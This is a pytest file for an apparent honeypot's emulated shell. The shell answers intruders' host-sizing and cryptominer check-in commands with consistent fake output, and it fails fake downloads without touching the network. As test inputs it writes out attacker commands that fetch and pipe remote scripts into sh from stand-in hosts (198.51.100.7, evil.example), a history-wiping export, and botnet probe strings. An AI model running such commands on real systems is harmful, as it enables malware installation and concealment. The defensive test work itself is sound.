"""The deterministic shell (agents.shell): host-sizing answers from the host profile,
pipelines evaluated in Python, hostile input, and the hooks that use it."""

from __future__ import annotations

import socket
import time
from types import SimpleNamespace

import pytest
from pydantic import ValidationError

from agents import hooks, shell
from agents.budget import CANNED_INTERACTIVE, Budget, BudgetConfig
from scenarios.loader import list_scenarios, load_scenario
from scenarios.schema import Hardware, Identity

NOW = 1_795_000_000.0          # 2026-11-18 11:06:40 UTC
KERNEL = ("Linux app01 6.8.0-45-generic #45-Ubuntu SMP PREEMPT_DYNAMIC Fri Aug 30 12:02:04 UTC "
          "2024 x86_64 x86_64 x86_64 GNU/Linux")
NVIDIA_PRODUCT = ("nvidia-smi -q | grep \"Product Name\" | head -n 1 | "
                  "awk '{print $4, $5, $6, $7, $8, $9, $10}'")


def host(**hw) -> shell.Host:
    return shell.Host(hostname="app01", kernel=KERNEL, os_pretty_name="Ubuntu 24.04.1 LTS",
                      seed="fixture-seed", hardware=Hardware(**hw))


def out(line: str, h: shell.Host | None = None, **kw) -> str | None:
    kw.setdefault("now", NOW)
    a = shell.answer(h or host(), line, **kw)
    return None if a is None else a.output


@pytest.fixture(autouse=True)
def reset_hooks():
    hooks.reset()
    yield
    hooks.reset()


# ---- the two real sessions ------------------------------------------------------------------

def test_miner_check_in_on_a_plain_cloud_vm():
    """Each line arrived as its own SSH exec request; a real VM with no GPU says this."""
    assert out("/bin/./uname -s -v -n -r -m") == (
        "Linux app01 6.8.0-45-generic #45-Ubuntu SMP PREEMPT_DYNAMIC Fri Aug 30 12:02:04 UTC "
        "2024 x86_64\n")
    assert out("uptime -p") == "up 6 weeks, 5 days, 13 hours, 19 minutes\n"
    assert out("lspci | grep VGA | cut -f5- -d ' '") == "Cirrus Logic GD 5446\n"
    assert out("lspci | grep VGA -c") == "1\n"
    assert out(NVIDIA_PRODUCT) == "-bash: nvidia-smi: command not found\n"
    assert out("lspci | grep \"3D controller\" | cut -f5- -d ' '") == ""


def test_miner_check_in_on_a_gpu_host():
    h = host(gpu="rtx3090", gpu_count=2)
    assert out("lspci | grep VGA | cut -f5- -d ' '", h) == (
        "Cirrus Logic GD 5446\n"
        "NVIDIA Corporation GA102 [GeForce RTX 3090] (rev a1)\n"
        "NVIDIA Corporation GA102 [GeForce RTX 3090] (rev a1)\n")
    assert out("lspci | grep VGA -c", h) == "3\n"
    # awk prints the empty fields $8..$10 too, so three trailing separators.
    assert out(NVIDIA_PRODUCT, h) == "NVIDIA GeForce RTX 3090   \n"
    assert out("lspci | grep \"3D controller\" | cut -f5- -d ' '", h) == ""
    dc = host(gpu="a100")
    # "3D controller" is two words, so the script's -f5- starts one word late, as on a real host.
    assert out("lspci | grep \"3D controller\" | cut -f5- -d ' '", dc) == (
        "Corporation GA100 [A100 PCIe 40GB] (rev a1)\n")
    assert out("lspci | grep VGA -c", dc) == "1\n"
    assert out(NVIDIA_PRODUCT, dc) == "NVIDIA A100-PCIE-40GB     \n"


def test_sh_opener_starts_a_nested_shell_silently():
    a = shell.answer(host(), "sh", now=NOW)
    assert a is not None and a.output == "" and a.status == 0


@pytest.mark.parametrize("line", ["system", "shell", "linuxshell"])
def test_device_cli_words_are_not_bash_commands(line):
    """A device CLI knows these; bash on a Linux host does not."""
    a = shell.answer(host(), line, now=NOW)
    assert a.output == f"-bash: {line}: command not found\n" and a.status == 127


def test_enable_lists_bash_builtins_as_bash_does():
    a = shell.answer(host(), "enable", now=NOW)
    lines = a.output.splitlines()
    assert a.status == 0 and a.stateless
    assert lines[:4] == ["enable .", "enable :", "enable [", "enable alias"]
    assert "enable cd" in lines and lines[-1] == "enable wait"


def test_busybox_applet_probe():
    assert out("/bin/busybox ECCHI") == "ECCHI: applet not found\n"
    assert out("busybox MIRAI") == "MIRAI: applet not found\n"
    assert out("busybox uname -m") == "x86_64\n"
    assert out("busybox").startswith("BusyBox v1.36.1")


# ---- identity, clock and consistency --------------------------------------------------------

@pytest.mark.parametrize("line", ["uname -a", "/bin/uname -a", "/bin/./uname -a",
                                  "/usr/bin/uname -a", "/usr/local/bin/../../bin/uname -a"])
def test_a_command_given_by_path_answers_the_same(line):
    assert out(line) == KERNEL.replace("app01", "app01") + "\n"


def test_unknown_paths_and_files_fall_back():
    assert out("/tmp/uname -a") is None
    assert out("./uname") is None
    assert out("cat /etc/shadow") is None
    assert out("/usr/bin/frobnicate") == "-bash: /usr/bin/frobnicate: No such file or directory\n"
    assert out("/usr/bin/nvidia-smi") == "-bash: /usr/bin/nvidia-smi: No such file or directory\n"


def test_uname_flags_follow_the_real_order_and_errors():
    assert out("uname") == "Linux\n"
    assert out("uname -m -s") == "Linux x86_64\n"
    assert out("uname -rn") == "app01 6.8.0-45-generic\n"
    assert out("uname -p") == "x86_64\n"
    assert out("uname -z").startswith("uname: invalid option -- 'z'\n")
    debian = shell.Host(kernel="Linux pbx 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian "
                               "6.1.112-1 (2024-10-22) x86_64 GNU/Linux",
                        os_pretty_name="Debian GNU/Linux 12 (bookworm)")
    assert out("uname -a", debian) == ("Linux srv01 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC "
                                       "Debian 6.1.112-1 (2024-10-22) x86_64 GNU/Linux\n")
    assert out("uname -p", debian) == "unknown\n"


def test_uptime_is_stable_per_sensor_and_follows_the_clock():
    h = host()
    assert out("uptime -p", h) == out("uptime -p", h)
    assert out("uptime -s") == "2026-10-01 21:46:49\n"
    assert out("uptime -s", now=NOW + 3600) == "2026-10-01 21:46:49\n"   # same boot
    up = float(out("cat /proc/uptime").split()[0])
    assert float(out("cat /proc/uptime", now=NOW + 60).split()[0]) == up + 60
    assert 2 * 86400 <= up <= 120 * 86400
    other = shell.Host(seed="another-sensor")
    assert out("uptime -s", other) != out("uptime -s")
    assert out("uptime").startswith(" 11:06:40 up 47 days, 13:19,  1 user,  load average: ")


def test_hardware_answers_agree_with_each_other():
    h = host(cpus=8, memory_mb=16384, disk_gb=200, gpu="t4", gpu_count=4)
    assert out("nproc", h) == "8\n"
    assert out("grep -c ^processor /proc/cpuinfo", h) == "8\n"
    assert out("cat /proc/cpuinfo | grep name | wc -l", h) == "8\n"
    assert "CPU(s):                          8\n" in out("lscpu", h)
    total_kb = int(out("head -n 1 /proc/meminfo", h).split()[1])
    assert out("free -m", h).splitlines()[1].split()[1] == str(total_kb // 1024)
    assert out("free", h).splitlines()[1].split()[1] == str(total_kb)
    assert out("lspci | grep -c 3D", h) == "4\n"
    assert out("nvidia-smi -L | wc -l", h) == "4\n"
    assert out("nvidia-smi --query-gpu=name,memory.total --format=csv,noheader", h) == \
        "Tesla T4, 15360 MiB\n" * 4
    assert "Tesla T4" in out("nvidia-smi", h) and "15360MiB" in out("nvidia-smi", h)
    assert "/dev/root" in out("df -h /", h) and " 194G " in out("df -h /", h)
    lines = out("nvidia-smi", h).splitlines()
    assert {len(line) for line in lines[1:] if line.strip()} == {91}


def test_default_host_has_no_gpu_and_plain_vga():
    assert out("which nvidia-smi") == ""
    assert shell.answer(host(), "which nvidia-smi", now=NOW).status == 1
    assert out("command -v nvidia-smi") == ""
    assert out("command -v wget") == "/usr/bin/wget\n"
    assert out("lspci | grep -i nvidia") == ""
    assert out("nvidia-smi") == "-bash: nvidia-smi: command not found\n"


def test_passwd_id_and_home_follow_the_scenario_accounts():
    s = load_scenario("saas", "seed-1")
    h = shell.host_for(s, "seed-1")
    users = {u.name: u for u in s.scenario.identity.users}
    passwd = out("cat /etc/passwd", h, user="intruder")
    for name, u in users.items():
        assert f"{name}:x:{u.uid}:{u.uid}:" in passwd
    assert "intruder:x:" in passwd                     # the login account exists
    uid = next(line.split(":")[2] for line in passwd.splitlines()
               if line.startswith("intruder:"))
    assert out("id -u", h, user="intruder") == f"{uid}\n"
    assert out("whoami", h, user="intruder") == "intruder\n"
    assert out("hostname", h) == f"{s.hostname}\n"
    assert out("uname -n", h) == f"{s.hostname}\n"
    assert s.scenario.identity.os_pretty_name in out("cat /etc/os-release", h)
    assert out("ls /root", h, user="intruder") == \
        "ls: cannot open directory '/root': Permission denied\n"


def test_distro_files_exist_only_on_their_family():
    s = load_scenario("bank", "seed-1")                  # Red Hat family
    h = shell.host_for(s, "seed-1")
    assert out("cat /etc/redhat-release", h) == \
        "Red Hat Enterprise Linux release 9.4 (Plow)\n"
    assert out("cat /etc/debian_version", h) == \
        "cat: /etc/debian_version: No such file or directory\n"
    assert out("cat /etc/redhat-release") == \
        "cat: /etc/redhat-release: No such file or directory\n"


# ---- pipelines ------------------------------------------------------------------------------

@pytest.mark.parametrize("line,expected", [
    ("cat /etc/hostname | grep -v app", ""),
    ("cat /etc/hostname | grep -i APP", "app01\n"),
    ("lspci | grep -c -i virtio", "3\n"),
    ("lspci | grep -vc Intel", "4\n"),
    ("lspci | head -n 2 | tail -n 1 | cut -d ' ' -f 2-3", "ISA bridge:\n"),
    ("lspci | head -2 | cut -c1-7", "00:00.0\n00:01.0\n"),
    ("lspci | tail -n +8", "00:05.0 Unclassified device [00ff]: Red Hat, Inc. Virtio memory "
                           "balloon\n"),
    ("lspci | head -n -7 | wc -l", "1\n"),
    ("cat /etc/passwd | grep ^root: | cut -d: -f1,7", "root:/bin/bash\n"),
    ("cat /etc/passwd | grep 'bash$' -c", "1\n"),
    ("lspci | grep VGA | awk '{print $NF}'", "5446\n"),
    ("lspci | grep VGA | awk -F: '{print $3}'", " Cirrus Logic GD 5446\n"),
    ("lspci | grep VGA | awk '{print $1 \"-\" $2}'", "00:02.0-VGA\n"),
    ("uname -a | awk '{print $3}'", "6.8.0-45-generic\n"),
    ("echo hello | wc -c", "6\n"),
    ("nproc && uname -m", "2\nx86_64\n"),
    ("nvidia-smi || echo no gpu", "-bash: nvidia-smi: command not found\nno gpu\n"),
    ("nvidia-smi && echo gpu", "-bash: nvidia-smi: command not found\n"),
    ("uname -s; nproc; cat /proc/cpuinfo | grep -c processor", "Linux\n2\n2\n"),
    ("grep MemTotal /proc/meminfo | awk '{print $2}'", "4060084\n"),
    ("echo -e '\\x67\\x61\\x79\\x66\\x67\\x74'", "gayfgt\n"),
    ("echo -n ok", "ok"),
])
def test_pipelines_over_our_own_output(line, expected):
    assert out(line) == expected


@pytest.mark.parametrize("line", [
    "cat /proc/cpuinfo > /etc/motd",       # redirection over a host file
    "uname -a 2>/var/x/y",                 # into a directory we do not know
    "echo $(id)",                          # substitution
    "echo `id`",
    "echo $HOME",                          # variables
    "ls /tmp/*",                           # globbing
    "lspci | sort",                        # a filter we do not evaluate
    "lspci | grep -E 'VGA|3D'",            # regex alternation
    "lspci | grep '[0-9]*'",               # bracket and star
    "lspci | grep -w VGA",                 # unsupported option
    "uname -a &",                          # background job
    "uname -a |",                          # dangling pipe
    "uname -a; frobnicate",                # one unknown command spoils the list
    "awk 'BEGIN{system(\"id\")}'",         # anything but {print ...}
    "lspci | awk '{print $1; system(\"id\")}'",
    "grep x",                              # would wait on the terminal
    "cat",
    "sh -c id",
    "wget -qO- http://198.51.100.7/x | sh -s",
])
def test_what_needs_a_real_shell_falls_back(line):
    assert shell.answer(host(), line, now=NOW) is None


def test_no_attacker_regex_is_compiled(monkeypatch):
    import re

    real = re.compile
    patterns: list[str] = []

    def spy(pattern, *args, **kwargs):
        patterns.append(pattern)
        return real(pattern, *args, **kwargs)

    monkeypatch.setattr(re, "compile", spy)
    marker = "Zq9marker"
    out(f"lspci | grep -c '{marker}.x'")
    out(f"cat /proc/cpuinfo | grep -E '^{marker}$'")
    assert not any(marker in str(p) for p in patterns)


# ---- hostile input --------------------------------------------------------------------------

def test_huge_and_control_input_is_refused_quickly():
    t = time.monotonic()
    assert shell.answer(host(), "echo " + "A" * 100_000, now=NOW) is None
    assert shell.answer(host(), "uname -a\x1b[2J", now=NOW) is None
    assert shell.answer(host(), "uname\x00 -a", now=NOW) is None
    assert shell.answer(host(), "echo '" + "x" * 2000 + "'", now=NOW) is None   # word cap
    assert time.monotonic() - t < 1.0


def test_deep_and_long_pipelines_are_capped():
    assert out(" | ".join(["lspci"] + ["cat"] * 7)) is not None          # 8 stages
    assert out(" | ".join(["lspci"] + ["cat"] * 8)) is None              # 9 stages
    assert out("; ".join(["true"] * 32)) == ""
    assert out("; ".join(["true"] * 33)) is None
    assert out("echo " + " ".join(["a"] * 70)) is None                  # words per command


@pytest.mark.parametrize("line,expected", [
    ("lspci | cut -f 99999999999999999999 -d ' ' | head -n 1", "\n"),
    ("lspci | cut -f 3-99999999999999999999 -d ' ' | head -n 1",
     "bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02)\n"),
    ("lspci | cut -c 99999999999999999999- | head -n 1", "\n"),
    ("lspci | head -n 99999999999999999999 | wc -l", "8\n"),
    ("lspci | tail -n 99999999999999999999 | wc -l", "8\n"),
    ("lspci | awk '{print $999999999}' | head -n 1", "\n"),
    ("lspci | cut -f 0 -d ' '", "cut: fields are numbered from 1\n"
                                "Try 'cut --help' for more information.\n"),
    ("lspci | cut -d '::' -f 1", "cut: the delimiter must be a single character\n"
                                 "Try 'cut --help' for more information.\n"),
    ("lspci | cut -d ' '", "cut: you must specify a list of bytes, characters, or fields\n"
                           "Try 'cut --help' for more information.\n"),
])
def test_absurd_numbers_and_bad_options(line, expected):
    assert out(line) == expected


def test_grep_work_is_bounded():
    big = host(cpus=64)
    t = time.monotonic()
    a = shell.answer(big, "cat /proc/cpuinfo | grep '" + "." * 250 + "'", now=NOW)
    assert a is None or isinstance(a.output, str)
    assert shell.answer(big, "cat /proc/cpuinfo | grep '" + "." * 300 + "'", now=NOW) is None
    assert time.monotonic() - t < 2.0


def test_output_is_capped_per_command_and_per_line():
    big = host(cpus=64)
    assert len(out("cat /proc/cpuinfo", big)) < shell.MAX_STAGE_OUTPUT
    # two 64-CPU cpuinfo files are more than one command may print: fall back
    assert shell.answer(big, "cat /proc/cpuinfo /proc/cpuinfo", now=NOW) is None
    assert shell.answer(big, "cat /proc/cpuinfo; cat /proc/cpuinfo", now=NOW) is None
    assert shell.answer(host(), "cat " + " ".join(["/etc/hostname"] * 9), now=NOW) is None
    assert out("cat " + " ".join(["/etc/hostname"] * 8)) == "app01\n" * 8


def test_attacker_text_in_errors_is_printable_and_short():
    a = shell.answer(host(), "busybox '" + "Z" * 500 + "'", now=NOW)
    assert a.output == "Z" * 64 + ": applet not found\n"
    w = out("wget 'http://exa mple.invalid/<x>'")
    assert "<" not in w and ">" not in w


def test_downloads_fail_plausibly_and_never_touch_the_network(monkeypatch):
    def no_network(*args, **kwargs):
        raise AssertionError("network used")

    monkeypatch.setattr(socket, "socket", no_network)
    monkeypatch.setattr(socket, "getaddrinfo", no_network)
    assert out("wget http://198.51.100.7/x.sh") == (
        "--2026-11-18 11:06:40--  http://198.51.100.7/x.sh\n"
        "Connecting to 198.51.100.7:80... failed: Network is unreachable.\n")
    assert out("wget evil.example/bins/x86") == (
        "--2026-11-18 11:06:40--  http://evil.example/bins/x86\n"
        "Resolving evil.example (evil.example)... failed: Temporary failure in name "
        "resolution.\nwget: unable to resolve host address ‘evil.example’\n")
    assert out("wget -q http://198.51.100.7/x.sh") == ""
    assert out("curl -fsSL http://evil.example/a | sh") == \
        "curl: (6) Could not resolve host: evil.example\n"
    assert out("curl -s http://198.51.100.7:8080/a") == ""
    assert out("curl http://198.51.100.7:8080/a") == (
        "curl: (7) Failed to connect to 198.51.100.7 port 8080 after 0 ms: Couldn't connect "
        "to server\n")
    assert out("tftp 198.51.100.7 -c get x") == "Transfer timed out.\n\n"
    assert shell.answer(host(), "wget http://198.51.100.7/x.sh", now=NOW).status == 4


# ---- the full canned reply ------------------------------------------------------------------

@pytest.mark.parametrize("line,expected", [
    ("frobnicate", "-bash: frobnicate: command not found\n"),
    ("cd /tmp", ""),
    ("export HISTFILE=/dev/null", ""),
    ("echo $SHELL", ""),
    ("printf '%s-%s\\n' a b", "a-b\n"),
    ("pwd", "/root\n"),
    ("cd /tmp; pwd", "/tmp\n"),
    ("", ""),
])
def test_reply_keeps_the_old_builtin_behaviour(line, expected):
    assert shell.reply(host(), line, user="root", now=NOW) == expected


def test_ls_layout_depends_on_the_terminal():
    names = out("ls /", interactive=False).splitlines()
    assert names[:3] == ["bin", "boot", "dev"] and "snap" in names
    columns = out("ls /", interactive=True)
    assert len(columns.splitlines()) == 2 and max(map(len, columns.splitlines())) <= 80


def test_lures_show_up_in_listings():
    s = load_scenario("saas", "seed-1")
    h = shell.host_for(s, "seed-1")
    for lure in s.lures():
        parts = lure.strip("/").split("/")
        if parts[0] in ("srv", "opt") and not parts[1].startswith("."):
            assert parts[1] in out(f"ls /{parts[0]}", h).split()


# ---- schema ---------------------------------------------------------------------------------

def test_hardware_schema_is_strict():
    Hardware(cpus=4, memory_mb=8192, disk_gb=100, gpu="a10g", gpu_count=2)
    for bad in ({"cpus": 0}, {"cpus": 65}, {"gpu": "voodoo2"}, {"gpu_count": 9},
                {"memory_mb": 1}, {"cpu_model": "x\ny"}, {"cpu_model": "<b>"}, {"fans": 3}):
        with pytest.raises(ValidationError):
            Hardware(**bad)


@pytest.mark.parametrize("name", list_scenarios())
def test_shipped_scenarios_load_with_a_plain_vm_profile(name):
    s = load_scenario(name, "seed-1")
    hw = s.scenario.identity.hardware
    assert hw.gpu is None and hw.cpus >= 1
    assert "GPU: none" in s.persona_fragment()
    h = shell.host_for(s, "seed-1")
    assert out("uname -n", h) == f"{s.hostname}\n"


def test_identity_rejects_unknown_hardware_keys():
    base = {"org_name": "Example Org", "hostname": "app01", "domain": "example.test",
            "internal_ips": ["10.0.0.5"], "os_pretty_name": "Ubuntu 24.04.1 LTS",
            "kernel": "Linux app01 6.8.0-45-generic #45-Ubuntu SMP x86_64 GNU/Linux"}
    Identity.model_validate(dict(base, hardware={"gpu": "l4"}))
    with pytest.raises(ValidationError):
        Identity.model_validate(dict(base, hardware={"gpu": "l4", "vram": 24}))


# ---- hooks: fallback and the model path -----------------------------------------------------

class RecordingHistory:
    def __init__(self, reply="model says hi\r\nroot@srv01:~# "):
        self.calls: list = []
        self.reply = reply
        self.store: dict = {}

    def get_session_history(self, session_id):
        from langchain_core.chat_history import InMemoryChatMessageHistory

        return self.store.setdefault(session_id, InMemoryChatMessageHistory())

    async def ainvoke(self, payload, config=None):
        self.calls.append(payload["messages"][-1].content)
        return SimpleNamespace(content=self.reply)


async def _ask(history, text, interactive=True, sid="s1"):
    return await hooks.persona_invoke(history, session_id=sid, src_ip="203.0.113.9",
                                      username="root", text=text, interactive=interactive,
                                      llm_config={"configurable": {"session_id": sid}})


def test_fallback_reply_uses_the_shared_shell():
    assert hooks.fallback_reply("lspci | grep VGA -c", True, "root") == "1\r\nroot@srv01:~# "
    assert hooks.fallback_reply("sh", True, "root") == "root@srv01:~# "
    assert hooks.fallback_reply("system", True, "root") == \
        "-bash: system: command not found\r\nroot@srv01:~# "
    assert hooks.fallback_reply("nproc", False, "root") == \
        f"{hooks.shell_host().hardware.cpus}\n"
    assert hooks.fallback_reply("frobnicate", True, "root") == \
        "-bash: frobnicate: command not found\r\nroot@srv01:~# "
    # an SSH exec command runs under bash -c; the default host's bash 5.1 adds "line 1"
    assert hooks.fallback_reply("frobnicate", False, "root") == \
        "bash: line 1: frobnicate: command not found\n"


async def test_host_facts_are_answered_ahead_of_the_model():
    budget = Budget(BudgetConfig())
    hooks.set_budget(budget)
    history = RecordingHistory()
    r = await _ask(history, "lspci | grep VGA -c")
    assert r.content == "1\r\nroot@srv01:~# " and getattr(r, "local_reply", False)
    r = await _ask(history, "uname -m", interactive=False)
    assert r.content == "x86_64\n"
    assert history.calls == [] and budget.global_tokens == 0
    assert budget.session_commands("s1") is None or budget.model_commands("s1") == 0
    # the model sees those turns in its history, so later answers stay consistent
    messages = history.store["s1"].messages
    assert [m.content for m in messages[:2]] == ["lspci | grep VGA -c", "1\r\nroot@srv01:~# "]


async def test_session_state_is_local_only_until_a_model_reply():
    hooks.set_budget(Budget(BudgetConfig()))
    history = RecordingHistory()
    # before any model reply the host is as profiled: ls, ps, pwd, passwd are local
    for text in ("ls", "ps aux", "pwd", "cat /etc/passwd", "echo hi", "id"):
        assert getattr(await _ask(history, text), "local_reply", False), text
    # commands that change the session always go to the model
    for text in ("cd /tmp", "wget http://198.51.100.7/x", "export A=1", "cat notes.txt"):
        await _ask(history, text)
    assert history.calls == ["cd /tmp", "wget http://198.51.100.7/x", "export A=1",
                             "cat notes.txt"]
    # after that, facts a session can change go to the model (root can rewrite release
    # files, and a download can create any path) ...
    for text in ("ls", "ps aux", "id", "uname -a", "cat /etc/os-release", "/usr/bin/xmr"):
        assert not getattr(await _ask(history, text), "local_reply", False), text
    # ... and facts no session can change stay local, under the model's last prompt
    for text in ("uname -r", "nproc", "free -m", "cat /proc/cpuinfo | grep -c processor",
                 "lspci", "busybox ECCHI", "enable", "w"):
        r = await _ask(history, text)
        assert getattr(r, "local_reply", False), text
    assert history.calls[-6:] == ["ls", "ps aux", "id", "uname -a", "cat /etc/os-release",
                                  "/usr/bin/xmr"]


async def test_a_fixed_fact_after_a_model_cd_shows_the_models_prompt():
    hooks.set_budget(Budget(BudgetConfig()))
    history = RecordingHistory("root@srv01:/var/tmp# ")
    await _ask(history, "cd /var/tmp")
    r = await _ask(history, "nproc")
    assert r.local_reply and r.content.endswith("\r\nroot@srv01:/var/tmp# ")


async def test_switch_off_sends_everything_to_the_model():
    hooks.set_budget(Budget(BudgetConfig()))
    hooks.set_local_replies(False)
    history = RecordingHistory()
    await _ask(history, "uname -a")
    assert history.calls == ["uname -a"]


async def test_local_answers_count_against_the_command_cap_and_shallow_mode():
    hooks.set_budget(Budget(BudgetConfig(max_commands_per_session=2)))
    history = RecordingHistory()
    assert not getattr(await _ask(history, "nproc"), "budget_exceeded", False)
    assert not getattr(await _ask(history, "nproc"), "budget_exceeded", False)
    r = await _ask(history, "nproc")
    assert r.budget_exceeded and r.content == CANNED_INTERACTIVE
    budget = Budget(BudgetConfig())
    budget.mode_provider = lambda key: "shallow"
    hooks.set_budget(budget)
    r = await _ask(history, "nproc", sid="s2")
    assert r.budget_exceeded and history.calls == []


async def test_summary_is_skipped_when_only_local_answers_were_given():
    from agents.budget import SUMMARY_SKIPPED

    budget = Budget(BudgetConfig())
    hooks.set_budget(budget)
    assert hooks.session_open("s9", "203.0.113.9") is None
    history = RecordingHistory()
    await _ask(history, "nvidia-smi -L", interactive=False, sid="s9")
    r = await hooks.summary_invoke(history, session_id="s9", src_ip="203.0.113.9",
                                   username="root", prompt="Examine the list", llm_config={})
    assert r.content == SUMMARY_SKIPPED and history.calls == []
    hooks.session_close("s9")


def test_local_replies_switch_is_read_from_config():
    from configparser import ConfigParser

    cp = ConfigParser()
    assert hooks.local_replies_enabled(cp) is True
    cp["llm"] = {"local_shell_replies": "false"}
    assert hooks.local_replies_enabled(cp) is False


# ---- bounded cost on the event loop ---------------------------------------------------------

def test_awk_program_parse_is_linear():
    # A regular expression here took tens of seconds on this line (time ~ length^4).
    line = "awk '{print" + " \t" * 500 + ";'"
    t = time.perf_counter()
    assert shell.answer(host(), line, now=NOW) is None
    assert shell._awk_program("{print" + " \t" * 5000 + "}") == [("field", 0)]
    assert time.perf_counter() - t < 0.5


@pytest.mark.parametrize("program,items", [
    ("{print}", [("field", 0)]), ("{ print ; }", [("field", 0)]),
    ("{print $4, $5}", [("field", 4), ("sep",), ("field", 5)]),
    ("{print $NF}", [("field", "NF")]), ('{print "x" $1}', [("text", "x"), ("field", 1)]),
    ("{print$1}", None), ("{print $1,}", None), ("{print $1234567890}", None),
    ("{print $NFx}", None), ("{printf $1}", None), ("{print $1", None), ("BEGIN{print}", None),
])
def test_awk_program_forms(program, items):
    assert shell._awk_program(program) == items


def test_cut_lists_are_merged_intervals():
    assert shell._ranges("5,1-3,2-4,9-") == [(1, 5), (9, 10**9)]
    assert shell._ranges("3,1") == [(1, 1), (3, 3)]
    assert shell._ranges("1-2-3") is None and shell._ranges("²") is None
    assert out("lspci | head -n 1 | cut -c 3,1-2,2-4") == "00:0\n"


def _worst_lines():
    cpuinfo = "cat /proc/cpuinfo | "
    odd = ",".join(str(2 * i + 1) for i in range(64))
    yield " ; ".join([cpuinfo + " | ".join(["cut -c 1-"] * 7)] * 8)
    yield " ; ".join([cpuinfo + " | ".join(["cut -d ' ' -f 1-"] * 7)] * 8)
    yield " ; ".join([cpuinfo + " | ".join([f"cut -c {odd}"] * 7)] * 8)
    yield " ; ".join([cpuinfo + " | ".join(["grep -vi 'a" + "." * 254 + "'"] * 7)] * 8)
    yield " ; ".join([cpuinfo + " | ".join(["grep -v '" + ". " * 100 + "'"] * 7)] * 8)
    yield " ; ".join([cpuinfo + " | ".join(["awk '{print $0}'"] * 7)] * 8)
    yield " ; ".join([cpuinfo + "awk '{print " + ",".join(["$1"] * 300) + "}'"] * 8)
    yield " ; ".join(["nvidia-smi --query-gpu=" + ",".join(["uuid"] * 100) + " --format=csv"] * 8)
    # eight pipelines of 20 cpuinfo files through grep
    yield " ; ".join(["cat " + " ".join(["/proc/cpuinfo"] * 20) + " | grep -v 'q.'"
                      + " | grep -v 'q.'" * 6] * 8)


@pytest.mark.parametrize("hw", [
    {"cpus": 64, "gpu": "h100", "gpu_count": 8},
    {"cpus": 64, "cpu_model": "AMD EPYC 7763 64-Core Processor"},
])
def test_worst_lines_are_cut_off_by_one_work_budget(hw):
    big = host(**hw)
    for line in _worst_lines():
        line = line[:shell.MAX_LINE]
        sh = shell._shell(big, "root", True, None, NOW, None)
        t = time.perf_counter()
        result = sh.run(line)
        assert result is None or (not big.hardware.gpu and "nvidia-smi" in line)
        assert time.perf_counter() - t < 0.25          # measured worst about 12 ms
        # one counter for the whole line; it stops within one charge of the budget
        assert sh.work <= shell.MAX_WORK + shell.MAX_STAGE_OUTPUT + shell.COMMAND


def test_real_sizing_lines_fit_the_budget_on_the_largest_host():
    big = host(cpus=64, gpu="h100", gpu_count=8)
    assert out("cat /proc/cpuinfo | grep -c processor", big) == "64\n"
    assert out("grep -c ^processor /proc/cpuinfo", big) == "64\n"
    assert out("cat /proc/cpuinfo | grep 'model name' | wc -l", big) == "64\n"
    assert out("nvidia-smi -L | wc -l", big) == "8\n"
    assert out(NVIDIA_PRODUCT, big) == "NVIDIA H100 80GB HBM3    \n" or \
        out(NVIDIA_PRODUCT, big).startswith("NVIDIA H100")


def test_long_words_tokenize_in_linear_time():
    # building a word by list concatenation took ~5 ms per 4000-character word
    h = host()
    t = time.perf_counter()
    for _ in range(50):
        shell.answer(h, "echo " + "a" * 4000, now=NOW)
    assert time.perf_counter() - t < 0.1


# ---- fidelity ---------------------------------------------------------------------------------

@pytest.mark.parametrize("line,expected", [
    ("lspci -v", ""),                          # works on a real host; we print nothing
    ("ls -la /", ""),
    ("uname -a > /tmp/u", ""),
    ("cat /etc/shadow", "cat: /etc/shadow: No such file or directory\n"),
    ("cat /tmp", "cat: /tmp: Is a directory\n"),
    ("head -n 5 /nope", "head: cannot open '/nope' for reading: No such file or directory\n"),
    ("awk '{print $1}' /nope", "awk: cannot open /nope (No such file or directory)\n"),
    ("grep -k x", "grep: invalid option -- 'k'\nUsage: grep [OPTION]... PATTERNS [FILE]...\n"
                  "Try 'grep --help' for more information.\n"),
    ("cat -y /etc/hostname", "cat: invalid option -- 'y'\n"
                             "Try 'cat --help' for more information.\n"),
    ("frobnicate", "-bash: frobnicate: command not found\n"),
])
def test_known_tools_never_say_command_not_found(line, expected):
    assert shell.reply(host(), line, now=NOW) == expected


@pytest.mark.parametrize("os_name,exec_error", [
    ("Ubuntu 20.04.6 LTS", "bash: x9: command not found\n"),
    ("Ubuntu 22.04.4 LTS", "bash: line 1: x9: command not found\n"),
    ("Ubuntu 24.04.1 LTS", "bash: line 1: x9: command not found\n"),
    ("Debian GNU/Linux 12 (bookworm)", "bash: line 1: x9: command not found\n"),
    ("Rocky Linux 8.9 (Green Obsidian)", "bash: x9: command not found\n"),
    ("Red Hat Enterprise Linux 9.4 (Plow)", "bash: line 1: x9: command not found\n"),
])
def test_exec_errors_follow_the_distributions_bash(os_name, exec_error):
    h = shell.Host(os_pretty_name=os_name)
    assert shell.reply(h, "x9", interactive=False, now=NOW) == exec_error
    assert shell.reply(h, "x9", interactive=True, now=NOW) == "-bash: x9: command not found\n"
    assert shell.reply(h, "/usr/bin/x9", interactive=False, now=NOW) == \
        exec_error.replace("x9: command not found", "/usr/bin/x9: No such file or directory")


@pytest.mark.parametrize("os_name,banner", [
    ("Ubuntu 20.04.6 LTS", "BusyBox v1.30.1 (Ubuntu 1:1.30.1-4ubuntu6.4) multi-call binary."),
    ("Ubuntu 22.04.4 LTS", "BusyBox v1.30.1 (Ubuntu 1:1.30.1-7ubuntu3) multi-call binary."),
    ("Ubuntu 24.04.1 LTS", "BusyBox v1.36.1 (Ubuntu 1:1.36.1-6ubuntu3.1) multi-call binary."),
    ("Debian GNU/Linux 12 (bookworm)", "BusyBox v1.35.0 (Debian 1:1.35.0-4+b3) multi-call binary."),
])
def test_busybox_version_fits_the_release(os_name, banner):
    h = shell.Host(os_pretty_name=os_name)
    assert shell.reply(h, "busybox", now=NOW).splitlines()[0] == banner
    assert shell.reply(h, "busybox MIRAI", now=NOW) == "MIRAI: applet not found\n"


def test_rhel_has_no_busybox():
    h = shell.Host(os_pretty_name="Rocky Linux 9.4 (Blue Onyx)")
    assert shell.reply(h, "busybox MIRAI", now=NOW) == "-bash: busybox: command not found\n"
    assert shell.reply(h, "which busybox", now=NOW) == ""


@pytest.mark.parametrize("memory_mb", [512, 4096, 6000, 1_048_576])
def test_meminfo_page_counts_are_whole_pages(memory_mb):
    h = host(memory_mb=memory_mb, cpus=7)
